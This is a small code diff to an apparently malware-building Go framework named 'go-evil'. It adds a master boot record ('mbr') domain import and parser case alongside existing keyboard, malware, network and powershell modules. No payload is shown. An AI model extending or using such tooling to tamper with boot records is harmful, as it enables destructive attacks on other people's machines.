@@ -9,6 +9,7 @@ import (
 	"github.com/s9rA16Bf4/go-evil/domains/keyboard"
 	"github.com/s9rA16Bf4/go-evil/domains/malware"
 	mal "github.com/s9rA16Bf4/go-evil/domains/malware/private"
+	"github.com/s9rA16Bf4/go-evil/domains/mbr"
 	"github.com/s9rA16Bf4/go-evil/domains/network"
 	"github.com/s9rA16Bf4/go-evil/domains/pastebin"
 	"github.com/s9rA16Bf4/go-evil/domains/powershell"
@@ -106,6 +107,9 @@ func Parser(file string) {
 		case "pastebin", "#paste":
 			io.Append_domain("pastebin")
 			pastebin.Parse(funct[0])
+		case "mbr":
+			io.Append_domain("mbr")
+			mbr.Parse(funct[0])
 
 		default:
 			notify.Error("Unknwon top level domain '"+funct[1]+"'", "parser.Parse()")
